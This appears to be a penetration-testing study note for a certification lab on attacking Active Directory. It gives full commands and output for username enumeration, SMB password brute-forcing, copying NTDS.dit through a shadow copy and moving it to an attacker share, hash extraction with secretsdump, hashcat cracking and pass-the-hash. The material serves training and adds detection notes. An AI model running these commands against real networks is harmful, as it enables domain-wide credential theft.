# 🏢 1. Attacking Active Directory & `NTDS.dit`

> [!info]  
> **Active Directory (AD)** is Microsoft's directory service for managing users, computers, authentication, permissions, and other resources in Windows enterprise environments.
> 
> For CPTS, two major credential attacks are:
> 
> 1. 🎯 **Dictionary attacks against AD accounts**
>     
> 2. 🔓 **Dumping password hashes from `NTDS.dit`**
>     

---

# 🧠 2. Domain Authentication vs. Local Authentication

When a Windows machine is **joined to a domain**, it normally sends domain authentication requests to the **Domain Controller (DC)** rather than validating them against the local SAM database.

```text
Domain-Joined Windows Machine
          │
          │ Domain Login
          ↓
     Domain Controller
          │
          ↓
   Active Directory
```

However, **local accounts still exist**.

A local account can be specified using the hostname:

```text
WS01\nameofuser
```

Or with:

```text
.\nameofuser
```

### 🔑 Important Distinction

```text
Domain Account
    ↓
Domain Controller
    ↓
Active Directory

Local Account
    ↓
Local Machine
    ↓
SAM
```

> [!important]  
> This distinction matters because compromising a domain-joined machine does **not** mean the local SAM is irrelevant. Depending on the access available, both **local and domain credential stores** can provide attack paths.

---

# 🌐 3. Network Position Before Attacking AD

Most AD attacks in this module assume that we already have a **foothold on the internal network**.

```text
🌐 Internet
    ↓
🔥 Edge Router
    ↓
🏢 Internal Network
    ↓
🖥️ Workstations / Servers
    ↓
🏢 Domain Controller
    ↓
🗄️ Active Directory
```

A target must generally be **network reachable**.

Possible remote-access exposure can include services such as:

```text
RDP → TCP/3389
```

> [!info]  
> In a real engagement, the initial compromise and establishment of an internal foothold often happen **before** the AD credential attacks described here.

---

# 🔐 4. Active Directory Authentication Mental Model

```text
👤 User Login
     ↓
🖥️ Windows System
     ↓
lsass.exe
     ↓
Authentication Package
     │
     ├── NTLM
     │
     └── Kerberos
             ↓
      🏢 Domain Controller
             ↓
      Active Directory
```

> [!important]  
> Once a system is domain-joined, **domain authentication is normally validated by the Domain Controller**, rather than directly against the local SAM.

---

# 🎯 5. Dictionary Attacks Against AD Accounts

A **dictionary attack** uses a predefined list of possible usernames and/or passwords and attempts authentication against the target.

```text
Username List + Password List
            ↓
     Authentication Attempts
            ↓
       Domain Controller
            ↓
     Valid / Invalid Login
```

### ⚠️ Why Network Dictionary Attacks Are Risky

They can be **noisy** because they generate:

- Many authentication requests
    
- Network traffic
    
- Security events
    
- Failed-login alerts
    
- Potential account lockouts
    

> [!warning]  
> Always consider the target's **account lockout policy** before attempting password attacks. Repeated failed authentication attempts can lock accounts and potentially disrupt users.

---

# 🔎 6. Username Enumeration & OSINT

A dictionary attack becomes much more effective when we first determine:

1. 👥 Real employees
    
2. 🏷️ Username naming convention
    
3. ✅ Valid usernames
    
4. 🔑 Likely passwords
    

### 🌐 Sources for Username Discovery

Useful sources can include:

- Company websites
    
- Employee directories
    
- Public documents
    
- Search engines
    
- Social media
    
- Publicly available PDFs
    

Email addresses are particularly useful.

For example:

```text
jdoe@inlanefreight.com
```

can reveal:

```text
Username → jdoe
Domain   → inlanefreight.com
```

### 🔎 Search Engine Example

A search such as:

```text
"inlanefreight.com filetype:pdf"
```

may reveal publicly indexed documents whose metadata contains usernames or employee information.

> [!tip]  
> The more accurately you determine the organization's username convention, the smaller your attack space becomes.

---

# 📛 7. Common Username Conventions

For an employee named **Jane Jill Doe**:

|Username conventionPractical example for `Jane Jill Doe`||
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|

### 🧠 Mental Model

```text
Real Name
   ↓
Identify Naming Convention
   ↓
Generate Possible Usernames
   ↓
Validate Usernames
   ↓
Password Attack
```

---

# 📝 8. Creating a Custom Username List

Example employee names:

```text
Ben Williamson
Bob Burgerstien
Jim Stevenson
Jill Johnson
Jane Doe
```

A manually created list might contain multiple possible naming conventions:

```bash
keelwa@htb[/htb]$ cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

> [!important]  
> The example deliberately includes multiple naming conventions because the organization's actual convention may not yet be known.

---

# 🤖 9. Automating Username Generation — Username Anarchy

Instead of manually generating combinations, we can use **Username Anarchy**.

```bash
keelwa@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt
```

It converts real names into many common username formats.

### Example Output

```text
ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
```

> [!tip]  
> Automation saves time, but **discovering the actual naming convention first is better** because it reduces unnecessary guesses and authentication attempts.

---

# 🔎 10. Enumerating Valid Usernames with Kerbrute

Before attacking passwords, it is useful to determine which usernames actually exist.

**Kerbrute** can perform:

- Username enumeration
    
- Brute-force attacks
    
- Password spraying
    

For username enumeration:

```bash
keelwa@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

Example:

```text
2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@inlanefreight.local
```

### 🔑 Important Parameters

```text
userenum
   ↓
Perform username enumeration

--dc 10.129.201.57
   ↓
Specify Domain Controller

--domain inlanefreight.local
   ↓
Specify AD domain

names.txt
   ↓
Input username candidates
```

### 🧠 Workflow

```text
👥 Employee Names
      ↓
🤖 Username Anarchy
      ↓
📄 Candidate Usernames
      ↓
🔎 Kerbrute userenum
      ↓
✅ Valid AD Users
```

---

# 🔨 11. Brute-Force AD Accounts with NetExec

Once valid usernames are identified, **NetExec** can be used with SMB to attempt authentication using a password list.

```bash
keelwa@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

Example successful result:

```text
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd!
```

### 🧩 Command Breakdown

```text
netexec
   ↓
smb
   ↓
10.129.201.57
   ↓
Domain Controller
   ↓
-u bwilliamson
   ↓
Target username
   ↓
-p /usr/share/wordlists/fasttrack.txt
   ↓
Password wordlist
```

> [!warning]  
> Password attacks against AD accounts can trigger **account lockout policies**. Before launching them, determine whether lockout thresholds and monitoring controls are present.

---

# 📋 12. Detecting the Attack in Windows Event Logs

Password attacks generate authentication events that can be investigated from:

```text
Event Viewer
    ↓
Windows Logs
    ↓
Security
```

For example, Domain Controller authentication validation can generate **Event ID 4776**.

> [!important]  
> Understanding the logs generated by an attack is important not only for attackers but also for making useful **remediation and detection recommendations** during a penetration test.

---

# 🗄️ 13. Understanding `NTDS.dit`

**NTDS** stands for **NT Directory Services**.

It is the directory service used by Active Directory to organize and manage network resources.

The primary AD database is:

```text
NTDS.dit
```

Default location:

```text
%SystemRoot%\ntds
```

The `.dit` extension refers to **Directory Information Tree**.

### 📦 What `NTDS.dit` Contains

It contains critical Active Directory information, including:

- Domain usernames
    
- Password hashes
    
- Directory data
    
- Schema information
    
- Other AD-related data
    

### 🚨 Why `NTDS.dit` Is Extremely Valuable

```text
NTDS.dit
    ↓
Domain Account Database
    ↓
Many / potentially all domain accounts
    ↓
Password Hashes
    ↓
Credential Cracking / Pass-the-Hash
```

> [!warning]  
> Compromising `NTDS.dit` can have **domain-wide consequences**, because it can expose credential material for a large number of domain accounts.

---

# 🔐 14. Requirements to Capture `NTDS.dit`

To copy the AD database, we need sufficient privileges on the Domain Controller.

Useful privileges include:

```text
Local Administrator
        OR
Domain Administrator
        OR
Equivalent privileges
```

First determine the account's group membership and privileges.

---

# 🖥️ 15. Connect to the Domain Controller with Evil-WinRM

After obtaining valid credentials, we can connect using **Evil-WinRM**.

```bash
keelwa@htb[/htb]$ evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM uses:

```text
Windows Remote Management (WinRM)
            +
PowerShell Remoting
            ↓
Remote PowerShell Session
```

---

# 👥 16. Check Local Group Membership

Once connected:

```powershell
*Evil-WinRM* PS C:\> net localgroup
```

The output includes groups such as:

```text
*Administrators
*Backup Operators
*Domain-related groups
*Remote Management Users
*Server Operators
...
```

The key question is:

> **Does our account have local Administrator privileges?**

---

# 👤 17. Check Domain User Membership

Use:

```powershell
*Evil-WinRM* PS C:\> net user bwilliamson
```

Important output:

```text
Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
```

This tells us that `bwilliamson` belongs to:

```text
Domain Users
Domain Admins
```

> [!success]  
> **Domain Admin membership is highly privileged.** In this scenario, the account has sufficient privileges to perform operations against the Domain Controller, including obtaining a copy of `NTDS.dit`.

---

# 📸 18. Creating a Volume Shadow Copy

`NTDS.dit` is actively used by Active Directory, so directly copying the live database is problematic.

A **Volume Shadow Copy Service (VSS)** snapshot provides a copy of the volume at a point in time.

### 🧠 Why VSS?

```text
Active C: Drive
      ↓
VSS Snapshot
      ↓
Point-in-time copy
      ↓
Access NTDS.dit safely from snapshot
```

VSS is commonly used by:

- Backup software
    
- Disaster recovery systems
    
- Applications that need consistent copies of active data
    

### 💻 Create Shadow Copy

```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

Example:

```text
Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

The important part is:

```text
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

This identifies the created shadow-copy volume.

---

# 📂 19. Copy `NTDS.dit` from the Shadow Copy

Create a destination directory and copy the database:

```cmd
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

The resulting file is:

```text
C:\NTDS\NTDS.dit
```

---

# 🔑 20. Why We Also Need `SYSTEM`

The hashes inside `NTDS.dit` are protected.

The required decryption information is associated with the **SYSTEM** registry hive.

Therefore:

```text
NTDS.dit
    +
SYSTEM
    ↓
Extract Domain Hashes
```

> [!important]  
> This is the same fundamental concept encountered when attacking **SAM**:
> 
> **You need both the credential database and the relevant system key material to successfully decrypt/extract the hashes.**

---

# 📤 21. Transfer `NTDS.dit` to the Attack Host

Once the file has been copied locally, it can be transferred to the attack host.

Example:

```cmd
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData

        1 file(s) moved.
```

The SMB share can be created using the technique covered previously in:

**Attacking SAM, SYSTEM, and SECURITY**

---

# 🔓 22. Extracting Hashes with Impacket `secretsdump`

With both:

```text
NTDS.dit
SYSTEM
```

available on the attack host, use Impacket's `secretsdump`:

```bash
keelwa@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Example:

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
<SNIP>
```

### 🧩 Command Breakdown

```text
-ntds NTDS.dit
    ↓
Active Directory database

-system SYSTEM
    ↓
SYSTEM hive / required key material

LOCAL
    ↓
Process the local files
```

---

# ⚡ 23. Faster Method — NetExec `ntdsutil`

NetExec can automate the NTDS extraction workflow using the `ntdsutil` module.

```bash
keelwa@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

The module uses VSS/`ntdsutil` to obtain the database and then extracts the credential material.

Important output:

```text
NTDSUTIL    10.129.201.57   445     DC01         [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL    10.129.201.57   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
```

It can then output extracted hashes:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

NetExec can also recover Kerberos key material such as:

```text
aes256-cts-hmac-sha1-96
aes128-cts-hmac-sha1-96
des-cbc-md5
```

> [!tip]  
> The advantage of the NetExec method is that it can automate the **capture → transfer → extraction** workflow instead of requiring each step manually.

---

# 🔨 24. Cracking NTLM Hashes with Hashcat

Once hashes have been extracted, they can be tested against password wordlists.

### 💻 Command

```bash
keelwa@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

Successful result:

```text
64f12cddaa88057e06a81b54e73b949b:Password1
```

### 🧩 Important

```text
-m 1000
    ↓
NTLM hash mode

64f12cddaa88057e06a81b54e73b949b
    ↓
Target NT hash

rockyou.txt
    ↓
Password candidates
```

---

# 🔓 25. What If the Hash Cannot Be Cracked?

A failed password-cracking attempt does **not necessarily mean the credential is useless**.

The recovered **NT hash itself** may be sufficient for authentication in some scenarios through:

## 🔄 Pass-the-Hash (PtH)

Pass-the-Hash abuses **NTLM authentication** to authenticate using an NT hash instead of knowing the plaintext password.

### Normal Authentication

```text
Username
   +
Cleartext Password
   ↓
NTLM Authentication
```

### Pass-the-Hash

```text
Username
   +
NT Hash
   ↓
NTLM Authentication
```

> [!important]  
> **PtH does not require recovering the plaintext password.** The NT hash can sometimes be used directly for authentication.

---

# 🖥️ 26. Pass-the-Hash with Evil-WinRM

Example:

```bash
keelwa@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

Important option:

```text
-H <HASH>
    ↓
Authenticate using the NT hash
```

### 🧠 PtH Mental Model

```text
NTDS.dit
   ↓
Extract NT Hash
   ↓
       ┌───────────────┐
       │ Crack Hash?    │
       └───────┬───────┘
               │
        ┌──────┴──────┐
        ↓             ↓
      YES             NO
        ↓             ↓
Plaintext PW       Keep NT Hash
        ↓             ↓
Normal Login       Pass-the-Hash
                        ↓
                 NTLM Authentication
                        ↓
                  Lateral Movement
```

---

# 🧭 27. Complete AD Credential Attack Workflow

```text
🏢 INTERNAL NETWORK FOOTHOLD
              ↓
       🔎 Identify Domain
              ↓
       👥 Gather Employee Names
              ↓
       🏷️ Determine Username Format
              ↓
       🤖 Generate Candidates
          Username Anarchy
              ↓
       ✅ Validate Users
            Kerbrute
              ↓
       🔑 Password Attack
            NetExec
              ↓
       🎯 Valid Credentials
              ↓
       🖥️ Access Domain Controller
            Evil-WinRM
              ↓
       👑 Check Privileges
       net localgroup
       net user <user>
              ↓
      Is Admin / Domain Admin?
              ↓
       📸 Capture NTDS.dit
              ↓
       VSS / ntdsutil
              ↓
       📦 Obtain SYSTEM
              ↓
       🔓 secretsdump
              ↓
       🧬 Domain NT Hashes
              ↓
       ┌──────┴─────────┐
       ↓                ↓
   🔨 Hashcat          🔄 PtH
       ↓                ↓
 Plaintext PW       NT Hash Auth
       ↓                ↓
    Access          Lateral Movement
```

---

# 📊 28. CPTS Cheat Sheet

|Objective|Tool / Command|Key Point|
|---|---|---|
|Identify current account|`whoami`|Determine current security context|
|Generate usernames|`username-anarchy`|Create common username formats|
|Enumerate AD users|`kerbrute ... userenum`|Identify valid usernames|
|Password attack|`netexec smb <IP> -u <USER> -p <WORDLIST>`|Test password candidates over SMB|
|Remote PowerShell|`evil-winrm -i <IP> -u <USER> -p '<PASSWORD>'`|Connect using WinRM|
|Check local groups|`net localgroup`|Determine local administrative membership|
|Check user memberships|`net user <USER>`|Check local/global group membership|
|Create VSS snapshot|`vssadmin CREATE SHADOW /For=C:`|Create point-in-time volume copy|
|Extract NTDS hashes|`impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`|Decrypt/extract domain hashes|
|Automated NTDS extraction|`netexec smb <IP> -u <USER> -p <PASS> -M ntdsutil`|Automates NTDS capture/extraction|
|Crack NTLM|`hashcat -m 1000 <HASH> <WORDLIST>`|Attempt plaintext recovery|
|Pass-the-Hash|`evil-winrm -i <IP> -u <USER> -H <HASH>`|Authenticate using NT hash|

---

# ⚠️ 29. Critical Concepts to Remember

> [!important]
> 
> ### SAM vs. NTDS.dit
> 
> ```text
> SAM
> ↓
> Local account hashes
> ↓
> Individual Windows machine
> 
> NTDS.dit
> ↓
> Domain account hashes
> ↓
> Domain Controller
> ↓
> Potentially many domain accounts
> ```

> [!important]
> 
> ### NTDS.dit + SYSTEM
> 
> ```text
> NTDS.dit
>      +
> SYSTEM
>      ↓
> secretsdump
>      ↓
> Domain NT hashes
> ```

> [!important]
> 
> ### Crack vs. Pass-the-Hash
> 
> ```text
> NT Hash
>    │
>    ├── Hashcat → plaintext password
>    │
>    └── PtH → authenticate using hash
> ```

---

# 🎯 30. Key Takeaways

> [!success]  
> **1. Domain-joined Windows systems normally send domain authentication requests to the Domain Controller.**

> [!success]  
> **2. Local accounts still authenticate against the local SAM and can be referenced using `HOSTNAME\user` or `.\user`.**

> [!success]  
> **3. Before password attacks, enumerate usernames and determine the organization's naming convention whenever possible.**

> [!success]  
> **4. `Username Anarchy` can automatically generate username candidates, while `Kerbrute` can help identify valid AD usernames.**

> [!success]  
> **5. Network password attacks can be noisy and may trigger account lockout policies.**

> [!success]  
> **6. `NTDS.dit` is the primary Active Directory database and contains domain credential material, including password hashes.**

> [!success]  
> **7. Capturing `NTDS.dit` generally requires high privileges on the Domain Controller.**

> [!success]  
> **8. VSS allows a point-in-time copy of an active volume, making it possible to obtain `NTDS.dit` while AD is running.**

> [!success]  
> **9. `NTDS.dit` must be paired with the appropriate `SYSTEM` key material to extract the protected hashes.**

> [!success]  
> **10. `secretsdump` can extract domain hashes from `NTDS.dit` + `SYSTEM`.**

> [!success]  
> **11. If cracking an NT hash fails, the hash may still be useful for Pass-the-Hash authentication.**

### 🧠 One-Line Exam Memory

```text
AD Users → Username Enumeration → Password Attack → DC Access
     ↓
High Privileges → NTDS.dit + SYSTEM → secretsdump
     ↓
NT Hashes → Hashcat OR Pass-the-Hash → Further Access
```